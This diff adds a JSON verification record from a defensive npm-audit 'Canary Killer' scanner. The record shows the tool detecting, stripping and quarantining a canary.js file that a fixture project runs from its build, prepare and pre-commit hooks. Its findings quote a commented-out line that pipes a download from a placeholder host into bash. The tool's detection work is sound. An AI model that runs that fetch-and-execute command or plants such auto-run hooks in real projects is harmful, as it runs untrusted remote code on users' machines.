@@ -1,0 +1,622 @@
+{
+  "date": "2026-10-12",
+  "implementationRevision": "1fc34946e9a8ddca745fb5d37dba1f7126376a72",
+  "node": "v24.16.0",
+  "platform": "win32",
+  "method": "Actual Canary Killer CLI processes. Protection ran on the checkout with explicit dependency and intentional fixture exclusions, then on an isolated untrusted reconstruction copy plus a temporary-directory root. No canary, scanned script, hook or downloaded content executed; no npm commands launched. Temporary verification paths removed after assertions. The checkout record retains scope, trust, actions, canary-target evidence and coverage gaps; unrelated text matches are omitted to keep the saved output bounded. Unrelated unresolved imports are represented by counts; canary-related unresolved references retain their paths, lines and evidence.",
+  "actualCheckout": {
+    "args": [
+      "E:\\np-audit",
+      "--exclude",
+      "E:\\np-audit\\node_modules",
+      "--exclude",
+      "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+      "--exclude",
+      "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks"
+    ],
+    "exit": 2,
+    "stderr": "",
+    "report": {
+      "roots": [
+        "E:\\np-audit"
+      ],
+      "complete": false,
+      "summary": {
+        "status": "incomplete",
+        "files": 138,
+        "findings": 682,
+        "unresolved": 478,
+        "unreadable": 0,
+        "exclusions": 6
+      },
+      "trust": {
+        "files": [
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "before": [
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+      },
+      "repairs": {
+        "actionsComplete": true,
+        "actions": [],
+        "failures": [],
+        "ignoreRoots": []
+      },
+      "quarantine": {
+        "actionsComplete": true,
+        "actions": [],
+        "excludedStorage": [],
+        "ignoreUpdates": [],
+        "ignoreFailures": [],
+        "before": {
+          "summary": {
+            "status": "incomplete",
+            "files": 138,
+            "findings": 682,
+            "unresolved": 478,
+            "unreadable": 0,
+            "exclusions": 6
+          },
+          "unreadable": [],
+          "exclusions": [
+            {
+              "path": "E:\\np-audit\\.git",
+              "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+            },
+            {
+              "path": "E:\\np-audit\\docs\\title-image.png",
+              "reason": "Per-file size limit reached (2081300 > 1048576 bytes)"
+            },
+            {
+              "path": "E:\\np-audit\\test\\fixtures\\obfuscated-large.js",
+              "reason": "Per-file size limit reached (2749737 > 1048576 bytes)"
+            },
+            {
+              "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+              "reason": "Explicit path exclusion"
+            },
+            {
+              "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+              "reason": "Explicit path exclusion"
+            },
+            {
+              "path": "E:\\np-audit\\node_modules",
+              "reason": "Explicit path exclusion"
+            }
+          ],
+          "unresolved": [
+            {
+              "path": "E:\\np-audit\\test\\unit\\repositoryScanner.test.js",
+              "reason": "Local import target could not be resolved",
+              "line": 90,
+              "evidence": "    'missing-import.js': 'require(\"./deleted/canary.js\");\\n',",
+              "evidenceTruncated": false,
+              "reference": "./deleted/canary.js",
+              "target": "E:\\np-audit\\test\\unit\\deleted\\canary.js",
+              "status": "missing"
+            }
+          ],
+          "unresolvedTotal": 478
+        },
+        "evidence": []
+      },
+      "protection": {
+        "allowed": false,
+        "failures": [
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\node_modules",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\node_modules",
+            "reason": "Explicit path exclusion"
+          },
+          {
+            "path": "E:\\np-audit\\test\\unit\\repositoryScanner.test.js",
+            "reason": "Local import target could not be resolved",
+            "line": 90,
+            "evidence": "    'missing-import.js': 'require(\"./deleted/canary.js\");\\n',",
+            "evidenceTruncated": false,
+            "reference": "./deleted/canary.js",
+            "target": "E:\\np-audit\\test\\unit\\deleted\\canary.js",
+            "status": "missing"
+          },
+          {
+            "path": "E:\\np-audit\\test\\unit\\repositoryScanner.test.js",
+            "line": 90,
+            "evidence": "    'missing-import.js': 'require(\"./deleted/canary.js\");\\n',",
+            "evidenceTruncated": false,
+            "reference": "./deleted/canary.js",
+            "target": "E:\\np-audit\\test\\unit\\deleted\\canary.js",
+            "status": "missing"
+          }
+        ]
+      },
+      "references": [
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\package.json",
+          "line": 5,
+          "evidence": "    \"build\": \"node canary.js && tsc\",",
+          "evidenceTruncated": false,
+          "reference": "canary.js",
+          "target": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "status": "exists"
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\package.json",
+          "line": 6,
+          "evidence": "    \"prepare\": \"node canary.js\"",
+          "evidenceTruncated": false,
+          "reference": "canary.js",
+          "target": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "status": "exists"
+        },
+        {
+          "path": "E:\\np-audit\\test\\unit\\repositoryScanner.test.js",
+          "line": 90,
+          "evidence": "    'missing-import.js': 'require(\"./deleted/canary.js\");\\n',",
+          "evidenceTruncated": false,
+          "reference": "./deleted/canary.js",
+          "target": "E:\\np-audit\\test\\unit\\deleted\\canary.js",
+          "status": "missing"
+        }
+      ],
+      "findings": [
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "line": 1,
+          "evidence": "// Incident-derived reconstruction: inert representative source text only.",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "File is named canary.js; inspect behavior independently of its name."
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "line": 4,
+          "evidence": "// exec('(curl -fsSL \"http://incident-reconstruction.invalid/engagement/stage\" | bash) || true');",
+          "evidenceTruncated": false,
+          "name": "remote-to-shell",
+          "severity": "review",
+          "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+          "line": 1,
+          "evidence": "// Incident-derived reconstruction: inert temporary-directory residue.",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "File is named canary.js; inspect behavior independently of its name."
+        }
+      ],
+      "unreadable": [],
+      "exclusions": [
+        {
+          "path": "E:\\np-audit\\.git",
+          "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+        },
+        {
+          "path": "E:\\np-audit\\docs\\title-image.png",
+          "reason": "Per-file size limit reached (2081300 > 1048576 bytes)"
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\obfuscated-large.js",
+          "reason": "Per-file size limit reached (2749737 > 1048576 bytes)"
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+          "reason": "Explicit path exclusion"
+        },
+        {
+          "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+          "reason": "Explicit path exclusion"
+        },
+        {
+          "path": "E:\\np-audit\\node_modules",
+          "reason": "Explicit path exclusion"
+        }
+      ],
+      "unresolved": [
+        {
+          "path": "E:\\np-audit\\test\\unit\\repositoryScanner.test.js",
+          "reason": "Local import target could not be resolved",
+          "line": 90,
+          "evidence": "    'missing-import.js': 'require(\"./deleted/canary.js\");\\n',",
+          "evidenceTruncated": false,
+          "reference": "./deleted/canary.js",
+          "target": "E:\\np-audit\\test\\unit\\deleted\\canary.js",
+          "status": "missing"
+        }
+      ],
+      "coverage": {
+        "canaryFiles": [
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js"
+          }
+        ],
+        "hookDirectories": [
+          {
+            "path": "E:\\np-audit\\.git\\hooks",
+            "configuredBy": "default"
+          }
+        ]
+      },
+      "limitations": [
+        "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+        "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+        "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+        "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+        "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload."
+      ],
+      "unresolvedTotal": 478
+    },
+    "exclusionReasons": [
+      {
+        "path": "E:\\np-audit\\node_modules",
+        "reason": "Dependency directory omitted; incomplete coverage is reported."
+      },
+      {
+        "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+        "reason": "Intentional regression state or representative hook preserved."
+      },
+      {
+        "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+        "reason": "Intentional regression state or representative hook preserved."
+      }
+    ],
+    "before": {
+      "package.json": "a3133d273fa9f1a8ecc3e1ef27c4b08f3edd66a2c89f4bf6b502198fada66a01",
+      ".npmauditor.json": "2cd50bbed588540d72c3c4cace59eb133094350586253d8d0f9e76d64db6e966",
+      ".gitignore": "58d739e9f7af549176b55e0cb60d42ce7beb2c5895d6fffc698f062bfd8a5d2a",
+      "test/fixtures/incident-derived-reconstruction/present/canary.js": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+      "test/fixtures/incident-derived-reconstruction/present/package.json": "447a3cd46c05ba9b2d898aea4d5eebbddb87716a0f6f01967cf40b099d13c4a4",
+      "test/fixtures/incident-derived-reconstruction/present/.githooks/pre-commit": "0ceed34739ed59a41ea30c424fe16f7a9582906e939a7be62ad7994d1bb0ae0c",
+      "test/fixtures/incident-derived-reconstruction/removed/package.json": "447a3cd46c05ba9b2d898aea4d5eebbddb87716a0f6f01967cf40b099d13c4a4",
+      "test/fixtures/incident-derived-reconstruction/removed/.githooks/pre-commit": "0ceed34739ed59a41ea30c424fe16f7a9582906e939a7be62ad7994d1bb0ae0c",
+      "test/fixtures/incident-derived-reconstruction/temporary/dev/shm/canary.js": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda"
+    },
+    "after": {
+      "package.json": "a3133d273fa9f1a8ecc3e1ef27c4b08f3edd66a2c89f4bf6b502198fada66a01",
+      ".npmauditor.json": "2cd50bbed588540d72c3c4cace59eb133094350586253d8d0f9e76d64db6e966",
+      ".gitignore": "58d739e9f7af549176b55e0cb60d42ce7beb2c5895d6fffc698f062bfd8a5d2a",
+      "test/fixtures/incident-derived-reconstruction/present/canary.js": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+      "test/fixtures/incident-derived-reconstruction/present/package.json": "447a3cd46c05ba9b2d898aea4d5eebbddb87716a0f6f01967cf40b099d13c4a4",
+      "test/fixtures/incident-derived-reconstruction/present/.githooks/pre-commit": "0ceed34739ed59a41ea30c424fe16f7a9582906e939a7be62ad7994d1bb0ae0c",
+      "test/fixtures/incident-derived-reconstruction/removed/package.json": "447a3cd46c05ba9b2d898aea4d5eebbddb87716a0f6f01967cf40b099d13c4a4",
+      "test/fixtures/incident-derived-reconstruction/removed/.githooks/pre-commit": "0ceed34739ed59a41ea30c424fe16f7a9582906e939a7be62ad7994d1bb0ae0c",
+      "test/fixtures/incident-derived-reconstruction/temporary/dev/shm/canary.js": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda"
+    }
+  },
+  "isolatedReconstruction": {
+    "args": [
+      "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project",
+      "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm"
+    ],
+    "exit": 2,
+    "stderr": "",
+    "report": {
+      "scan": "canary-killer",
+      "roots": [
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm"
+      ],
+      "complete": false,
+      "findings": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.gitignore",
+          "line": 2,
+          "evidence": "canary.js",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.gitignore",
+          "line": 2,
+          "evidence": "canary.js",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+        }
+      ],
+      "references": [],
+      "unreadable": [],
+      "exclusions": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.git",
+          "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.np-audit-quarantine",
+          "reason": "Quarantine storage is not analyzed"
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.np-audit-quarantine",
+          "reason": "Quarantine storage is not analyzed"
+        }
+      ],
+      "unresolved": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\package.json",
+          "reason": "Command entry point is not statically resolved",
+          "line": 5,
+          "evidence": "    \"build\": \"tsc\"",
+          "evidenceTruncated": false,
+          "command": "tsc"
+        }
+      ],
+      "coverage": {
+        "files": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.git\\config",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.git\\hooks\\pre-commit",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.gitignore",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\package.json",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.gitignore"
+        ],
+        "canaryFiles": [],
+        "repositories": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project"
+          }
+        ],
+        "entries": 9,
+        "bytes": 338,
+        "gitConfigs": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.git\\config"
+          }
+        ],
+        "hookDirectories": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.git\\hooks",
+            "configuredBy": "default"
+          }
+        ]
+      },
+      "limits": {
+        "files": 10000,
+        "entries": 20000,
+        "fileBytes": 1048576,
+        "totalBytes": 33554432,
+        "records": 2000,
+        "depth": 100
+      },
+      "limitations": [
+        "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+        "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+        "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+        "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+        "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload."
+      ],
+      "summary": {
+        "status": "incomplete",
+        "files": 5,
+        "findings": 2,
+        "unresolved": 1,
+        "unreadable": 0,
+        "exclusions": 3
+      },
+      "trust": {
+        "files": [],
+        "before": [],
+        "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+      },
+      "repairs": {
+        "actionsComplete": true,
+        "actions": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.git\\hooks\\pre-commit",
+            "line": 3,
+            "evidence": "node canary.js",
+            "evidenceTruncated": false,
+            "before": "node canary.js",
+            "after": null,
+            "targets": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\canary.js"
+            ]
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\package.json",
+            "line": 6,
+            "evidence": "    \"prepare\": \"node canary.js\"",
+            "evidenceTruncated": false,
+            "script": "prepare",
+            "before": "node canary.js",
+            "after": null,
+            "targets": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\canary.js"
+            ]
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\package.json",
+            "line": 5,
+            "evidence": "    \"build\": \"node canary.js && tsc\",",
+            "evidenceTruncated": false,
+            "script": "build",
+            "before": "node canary.js && tsc",
+            "after": "tsc",
+            "targets": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\canary.js"
+            ]
+          }
+        ],
+        "failures": [],
+        "ignoreRoots": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project"
+        ]
+      },
+      "quarantine": {
+        "actionsComplete": true,
+        "actions": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\canary.js",
+            "status": "quarantined",
+            "ignore": {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.gitignore",
+              "status": "updated"
+            },
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.np-audit-quarantine\\entry-pXyQBM\\payload.quarantined",
+            "metadata": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.np-audit-quarantine\\entry-pXyQBM\\metadata.json"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\canary.js",
+            "status": "quarantined",
+            "ignore": {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.gitignore",
+              "status": "updated"
+            },
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.np-audit-quarantine\\entry-wqFgP0\\payload.quarantined",
+            "metadata": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.np-audit-quarantine\\entry-wqFgP0\\metadata.json"
+          }
+        ],
+        "excludedStorage": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.np-audit-quarantine",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.np-audit-quarantine"
+        ],
+        "ignoreUpdates": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.gitignore",
+            "status": "updated"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.gitignore",
+            "status": "updated"
+          }
+        ],
+        "ignoreFailures": [],
+        "before": {
+          "summary": {
+            "status": "incomplete",
+            "files": 5,
+            "findings": 6,
+            "unresolved": 1,
+            "unreadable": 0,
+            "exclusions": 1
+          },
+          "unreadable": [],
+          "exclusions": [
+            {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.git",
+              "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+            }
+          ],
+          "unresolved": [
+            {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\package.json",
+              "reason": "Command entry point is not statically resolved",
+              "line": 5,
+              "evidence": "    \"build\": \"node canary.js && tsc\",",
+              "evidenceTruncated": false,
+              "command": "tsc"
+            }
+          ]
+        },
+        "evidence": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\canary.js",
+            "line": 1,
+            "evidence": "// Incident-derived reconstruction: inert representative source text only.",
+            "evidenceTruncated": false,
+            "name": "canary-indicator",
+            "severity": "indicator",
+            "detail": "File is named canary.js; inspect behavior independently of its name."
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\canary.js",
+            "line": 4,
+            "evidence": "// exec('(curl -fsSL \"http://incident-reconstruction.invalid/engagement/stage\" | bash) || true');",
+            "evidenceTruncated": false,
+            "name": "remote-to-shell",
+            "severity": "review",
+            "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\canary.js",
+            "line": 1,
+            "evidence": "// Incident-derived reconstruction: inert temporary-directory residue.",
+            "evidenceTruncated": false,
+            "name": "canary-indicator",
+            "severity": "indicator",
+            "detail": "File is named canary.js; inspect behavior independently of its name."
+          }
+        ]
+      },
+      "protection": {
+        "allowed": true,
+        "failures": []
+      }
+    },
+    "before": {
+      "scripts": {
+        "build": "node canary.js && tsc",
+        "prepare": "node canary.js"
+      },
+      "hook": "#!/bin/sh\n# Incident-derived reconstruction: representative hook, not recovered content.\nnode canary.js\n",
+      "payloadSha256": {
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\canary.js": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\canary.js": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda"
+      }
+    },
+    "after": {
+      "scripts": {
+        "build": "tsc"
+      },
+      "hook": "#!/bin/sh\n# Incident-derived reconstruction: representative hook, not recovered content.\n",
+      "ignoreFiles": {
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\project\\.gitignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step2-proof-yRMnJw\\temporary\\dev\\shm\\.gitignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n"
+      },
+      "quarantinedContentHashesMatched": true
+    }
+  }
+}
